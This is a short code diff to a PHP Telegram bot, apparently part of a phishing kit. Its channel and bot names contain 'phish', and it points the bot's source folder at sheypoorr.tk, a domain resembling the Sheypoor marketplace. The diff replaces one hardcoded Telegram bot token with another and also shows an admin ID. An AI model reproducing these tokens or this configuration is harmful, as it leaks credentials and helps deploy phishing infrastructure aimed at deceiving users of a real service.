@@ -9,7 +9,7 @@ JOIN : @Octopus_Card */
 
 error_reporting(0);
 date_default_timezone_set('Asia/Tehran');
-define('API_KEY','1250221764:AAE46mUYbAPXhIWwHLbwMxU3p2O82_tgIDM'); // توکن ربات
+define('API_KEY','1267453518:AAEMtjXv9y5g5FSxQpGcFYB9Quwiw4GbpKs'); // توکن ربات
 function vestor($method,$datas=[]){
     $url = "https://api.telegram.org/bot".API_KEY."/".$method;
     $ch = curl_init();
@@ -104,7 +104,7 @@ $channel = "@geladiator_phish"; // آیدی کانال همراه @
 $admins = [1089011576]; // آیدی عددی ادمین
 $admin = 1089011576;
 $botid = "geladiator_phish"; // آیدی کانال بدون @
-$url = "https://netstudent.ml"; // آدرس پوشه سورس 
+$url = "https://sheypoorr.tk"; // آدرس پوشه سورس 
 //==============================
 $update = json_decode(file_get_contents("php://input"));
 $message = $update->message;
